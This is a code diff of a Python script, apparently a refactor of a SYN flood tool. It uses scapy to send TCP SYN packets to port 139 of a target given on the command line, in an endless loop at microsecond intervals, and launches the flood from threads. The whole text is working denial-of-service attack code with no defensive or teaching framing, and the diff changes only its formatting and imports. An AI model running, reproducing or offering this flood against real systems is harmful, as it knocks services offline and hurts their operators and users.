@@ -5,9 +5,12 @@ target = str(sys.argv[1])
 
 print("Attacking " + target + " with SYN flood.")
 
+
 def syn_flood():
-    packet = IP(dst = target)/TCP(dport = 139, flags = "S") / ("payloadpayloadpayload")
-    send(packet, inter = 0.000001, loop = 1)
+    packet = scapy.IP(dst=target)/scapy.TCP(dport=139, flags="S") / \
+        ("payloadpayloadpayload")
+    send(packet, inter=0.000001, loop=1)
+
 
 t1 = threading.Thread(target=syn_flood())
 t2 = threading.Thread(target=syn_flood())
